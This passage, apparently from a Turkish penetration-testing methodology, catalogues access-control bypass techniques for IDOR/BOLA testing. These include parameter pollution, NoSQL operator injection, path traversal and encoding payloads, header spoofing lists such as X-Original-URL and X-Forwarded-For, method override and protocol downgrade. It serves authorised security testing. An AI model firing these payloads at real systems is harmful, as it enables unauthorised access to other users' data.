# 47. HTTP Parameter Pollution (HPP) ile object reference manipülasyonu

Aynı parametrenin birden fazla kez gönderilmesi bazı framework/proxy/backend
kombinasyonlarında farklı katmanlarda farklı değerin okunmasına yol açabilir:

```http
GET /api/orders?id=1001&id=1002
```

veya body'de:

```json
{
  "order_id": "1001",
  "order_id": "1002"
}
```

Gateway/WAF ilk değeri, backend son değeri (veya tam tersini) okuyorsa
authorization kontrolü ile gerçek object lookup'ı farklı ID'ler üzerinde
çalışabilir. Bu, bölüm 18'deki gateway/service mismatch pattern'inin
tek bir HTTP request içinde gerçekleşen özel bir hâlidir.

Array formatı da test edilmelidir:

```text
id=1001
id[]=1001
id[]=1001&id[]=1002
```

---

# 54. Query operator injection ile object reference manipülasyonu (NoSQL/ORM bağlamı)

Bazı backend'ler ID alanını doğrudan sorgu operatörü olarak kabul edebilir
(özellikle MongoDB gibi doküman tabanlı veritabanlarıyla çalışan API'lerde):

```json
{
  "user_id": { "$ne": null }
}
```

Eğer bu tür bir payload sunucu tarafında filtrelenmeden query'e taşınıyorsa,
tekil bir object yerine "koşulu sağlayan ilk/tüm object'ler" dönebilir; bu
IDOR ile NoSQL injection'ın kesiştiği bir alandır. Test yalnızca uygulamanın
gerçekten böyle bir veritabanı/ORM kullandığı ve girdiyi filtrelemediği
durumlarda anlamlıdır; rastgele operatör payload'ları göndermek tek başına
kanıt oluşturmaz — dönen sonucun gerçekten başka kullanıcıya ait veri
içerdiği doğrulanmalıdır.

---

# 55. Content-Type / parser değişikliği ile authorization bypass denemesi

Aynı endpoint farklı `Content-Type` değerleriyle farklı parser/validation
code path'ine düşebilir:

```text
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: application/xml
```

Bir content-type için object-level authorization middleware çalışırken
diğerinde çalışmayabilir (özellikle eski/legacy XML veya form-encoded
endpoint'lerde). Aynı object reference'ı farklı content-type'larla göndermek,
gözden kaçmış bir authorization code path'i ortaya çıkarabilir.

---

# 60. Path Traversal ile Object Reference Manipülasyonu

Bazı uygulamalar object ID'yi dosya yolu veya dizin yapısı olarak kullanır:

```http
GET /api/documents/111/report.pdf
```

Path traversal payload'ları ile başka kullanıcının dizinine erişilebilir:

```text
../../222/report.pdf
..%2f..%2f222%2freport.pdf
....//....//222//report.pdf
%2e%2e%2f%2e%2e%2f222%2freport.pdf
```

Özellikle:

```text
/files/{path}
/download/{path}
/export/{path}
/media/{path}
/static/{path}
```

gibi endpoint'lerde test edilmelidir. Object ID path traversal ile manipüle edilebiliyorsa ve bu başka kullanıcının kaynağına erişim sağlıyorsa, bu klasik path traversal ile BOLA'nın kesiştiği bir senaryodur.

---

# 61. HTTP Header Injection ile Identity Spoofing ve Path-Rewrite Bypass

Bazı reverse proxy/load balancer/CDN/WAF yapılandırmaları, client-controlled
header'ları trusted internal header olarak iletir veya path'i bu header'a
göre yeniden yazar. Bu ailenin iki alt kullanımı vardır: **(a)** path/route
rewrite ile 403/erişim kısıtlamasını atlatmak, **(b)** identity/IP spoofing
ile authorization kararını değiştirmek.

## (a) Path-rewrite / route-override header'ları

```http
X-Original-URL: /api/admin/users/123
X-Rewrite-URL: /api/admin/users/123
X-Override-URL: /api/admin/users/123
X-Originating-URL: /api/admin/users/123
X-Forwarded-Path: /api/admin/users/123
X-Proxy-URL: /api/admin/users/123
X-HTTP-Method-Override: GET
X-Method-Override: GET
Base-URL: /api/admin/users/123
```

Bu header'lar özellikle önden bir proxy/WAF tarafından `/admin/*` gibi bir
path'e engelleyici kural uygulanmış, ancak arkadaki uygulama sunucusu asıl
route'u bu header'dan okuyan mimarilerde etkilidir: proxy `Authorization:
Bearer TOKEN_A` ile gelen `/api/profile` isteğini engellemezken, backend
`X-Original-URL` içindeki `/api/admin/users/123`'e yönlendirilir ve proxy
seviyesindeki kısıtlama tamamen atlanmış olur.

Aynı fikrin klasik "403 bypass" path-manipülasyon varyantları (bkz. bölüm
65-67 ile birlikte değerlendirilmelidir):

```text
/admin/users/123
/admin//users/123
/admin/./users/123
/admin/users/123/
/admin/users/123..;/
/admin/users/123;/
/./admin/users/123
//admin/users/123
/%2e/admin/users/123
/admin/users/123%20
/admin/users/123%09
/admin/users/123.json
/admin/users/123?
/;/admin/users/123
/admin/users/123#
```

Bunların hepsi "kısıtlanan path'e farklı bir temsille ulaşıp arka uçta aynı
handler'a düşme" mantığına dayanır; hangilerinin çalıştığı hedefin
proxy/framework kombinasyonuna bağlıdır ve tek tek doğrulanmalıdır.

## (b) Identity / IP spoofing header'ları

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: internal.example.com
X-Forwarded-Server: internal.example.com
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Host: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-User: admin
X-Remote-User-Id: 999
X-Authenticated-User: admin
X-Authenticated-Userid: 999
X-User-Role: admin
X-Is-Admin: true
X-Debug: true
X-Internal-Request: true
```

Bu header'lar tipik olarak iki senaryoda işe yarar: içeride "sadece internal
network'ten gelen isteklere izin ver" mantığı `X-Forwarded-For`/`X-Real-IP`
gibi client-controlled bir header'a bakıyorsa (IP whitelist bypass); ya da
uygulama authenticated identity'yi session yerine doğrudan bir header'dan
okuyorsa (bkz. bölüm 10 "Header'da IDOR" ile aynı kök neden, burada fark
hedefin normal kullanıcı objecti değil admin/internal erişim olmasıdır).

Eğer backend bu header'ları güvenilir kaynak olarak kabul ediyorsa ve bunlar
client tarafından manipüle edilebiliyorsa, object-level authorization
bypass'a ve/veya erişim kontrolü (access-control) bypass'ına yol açabilir.
**Bir header'ın kabul edilmesi tek başına bulgu değildir** — bölüm 37'deki
kanıt standardına göre, bu header ile gerçekten korunan bir object'e/path'e
erişim sağlandığı gösterilmelidir.

---

# 62. HTTP Method Override ile Authorization Bypass

Bazı framework'ler `X-HTTP-Method-Override` veya `_method` parametresi ile HTTP method'unu değiştirmeye izin verir:

```http
POST /api/orders/1002 HTTP/2
X-HTTP-Method-Override: DELETE
Authorization: Bearer TOKEN_A
```

GET korumalı bir endpoint, POST override ile farklı authorization mantığı çalıştırabilir. Aynı object için farklı method override kombinasyonları test edilmelidir.

---

# 63. JSON Parameter Pollution (JPP)

JSON body'de aynı key birden fazla kez gönderildiğinde farklı parser'lar farklı davranabilir:

```json
{
  "user_id": "111",
  "user_id": "222"
}
```

Bazı parser'lar ilk değeri, bazıları son değeri, bazıları array olarak okur. Eğer:

```text
Gateway/validation layer → ilk user_id (111) ile authorize
Backend/ORM → son user_id (222) ile lookup
```

ise authorization bypass oluşur. Ayrıca:

```json
{
  "user_id": ["111", "222"]
}
```

formatı da test edilmelidir.

---

# 64. API Key / Token Format Değişikliği ile Authorization Bypass

Bazı uygulamalar farklı token türlerini farklı authorization pipeline'larından geçirir:

```text
Bearer TOKEN_A        → normal auth pipeline
Api-Key KEY_A         → farklı auth pipeline
X-API-Key KEY_A       → farklı auth pipeline
X-Auth-Token TOKEN_A  → farklı auth pipeline
```

Aynı object reference farklı token türleriyle gönderildiğinde, bir tür object-level authorization yaparken diğeri yapmayabilir.

---

# 65. Case Sensitivity / Unicode Normalization Bypass

URL path veya header'da büyük/küçük harf farkı:

```text
/api/Orders/1002
/api/ORDERS/1002
/api/orders/1002
```

Veya Unicode normalization farkları:

```text
/api/users/１２３ (full-width)
/api/users/123   (half-width)
```

Bir katman case-sensitive/Unicode-aware kontrol yaparken diğeri normalize edip farklı bir code path'e düşebilir.

## Overlong / null-byte encoding varyantları

Bazı eski veya kötü yapılandırılmış parser'lar overlong UTF-8 encoding'i
veya null byte'ı normalize sırasında farklı yorumlayabilir:

```text
%c0%af         → overlong-encoded '/'
%e0%80%af      → overlong-encoded '/'
/api/orders/1002%00.json
/api/orders/1002%00
/api/orders/1002.json%00
```

Amaç aynı: bir katmanın "izin verilen" bir uzantı/format sanıp geçirdiği,
diğerinin ise object ID olarak decode ettiği bir path üretmek. Modern
framework'lerin çoğu bunu reddeder; test yalnızca hedefin eski/özel bir
parser kullandığı durumlarda anlamlıdır.

## Backslash / forward-slash karışımı

IIS/Windows tabanlı backend'ler veya bazı Node.js router'lar `\` ve `/`
karakterlerini eşdeğer sayabilirken önündeki proxy/WAF saymayabilir:

```text
/api\orders\1002
\api/orders/1002
/api/orders\1002
/api/orders%5c1002
```

Proxy `/admin` path'ini engellerken backend `\admin`'i aynı route'a
çözümlüyorsa, kısıtlama atlanabilir.

---

# 66. Trailing Slash ve Path Normalization Farkları

```text
/api/orders/1002
/api/orders/1002/
/api/orders/1002//
/api/orders/1002/.
/api/orders/1002/..
/api/orders/1002/./
/api/orders/1002/..;/
/api/orders/1002;/
/api/orders/1002;param=x
/api/./orders/1002
/api//orders/1002
```

Bazı framework'lerde trailing slash, çift slash veya `;param` (path
parameter) farklı route handler'a düşer ve farklı authorization middleware
çalıştırabilir. `;`-tabanlı varyantlar (`..;/`) özellikle bazı Java/Spring
tabanlı proxy+backend kombinasyonlarında bilinen bir path-normalization
uyuşmazlığı sınıfıdır; her framework'te çalışmaz ve tek tek doğrulanmalıdır.

## Wildcard / path-segment manipülasyonu

```text
/api/*/orders/1002
/api/%2A/orders/1002
/api/{id}/orders/1002
```

Bazı route tanımlarında wildcard/parametrik segmentler, önündeki
kısıtlama kuralının beklemediği bir eşleşme üretebilir.

---

# 67. Double URL Encoding

```text
%2520 → %20 → (space)
%252f → %2f → /
%252e%252e%252f → ../
```

Bir katman double-decode yaparken diğeri single-decode yaparsa, path normalization sonucu farklı object lookup'ı tetikleyebilir.

---

# 67a. HTTP Metod ve Protokol Downgrade ile Bypass

`X-HTTP-Method-Override`'dan (bkz. bölüm 62) farklı olarak, burada asıl
HTTP metodunun veya protokolün kendisi değiştirilir:

```text
HEAD    /api/admin/users/1002   (GET-korumalı endpoint'te HEAD denenmemiş olabilir)
TRACE   /api/admin/users/1002
CONNECT /api/admin/users/1002
OPTIONS /api/admin/users/1002
```

Bazı authorization middleware'leri yalnızca `GET`/`POST`/`PUT`/`DELETE`
için kayıtlıdır; `HEAD` veya `OPTIONS` gibi daha az kullanılan metodlar
farklı bir code path'ten geçip veri sızdırabilir (özellikle `HEAD`,
response body'yi göstermese de header'larda ownership/varlık bilgisi
sızdırabilir — bkz. bölüm 44 "Blind IDOR").

HTTP/1.0'a düşürme (bazı eski middleware'ler yalnızca HTTP/1.1 için
authorization eklentisi çalıştırır) ve scheme/protokol spoofing:

```http
X-Forwarded-Proto: http
X-Forwarded-Scheme: http
X-Forwarded-Ssl: off
```

"Yalnızca HTTPS'te zorunlu" şeklinde tasarlanmış bir authorization/
redirect kuralı, arka uçtaki uygulama gerçek bağlantı protokolü yerine bu
client-controlled header'a güveniyorsa atlatılabilir.

---

# 67b. Header Casing ve Duplicate Header ile Authorization Karışıklığı

HTTP header isimleri case-insensitive olmalıdır, ancak iki farklı katman
(örn. WAF ve backend) bunu farklı şekilde ele alabilir:

```http
X-User-Id: 111
x-user-id: 222
X-USER-ID: 222
```

Aynı header'ın birden fazla kez, farklı case veya farklı değerle
gönderilmesi durumunda hangi katmanın hangi değeri okuduğu (bkz. bölüm 47
"HTTP Parameter Pollution" ile aynı kök neden, burada header seviyesinde)
authorization kontrolü ile gerçek object lookup'ı arasında farklılık
yaratabilir. Ayrıca bazı WAF kuralları yalnızca belirli bir case'i
(`X-User-Id`) eşleştirirken backend case-insensitive parse ediyorsa, farklı
case ile gönderilen aynı header WAF'ı atlayıp backend'e ulaşabilir.

---
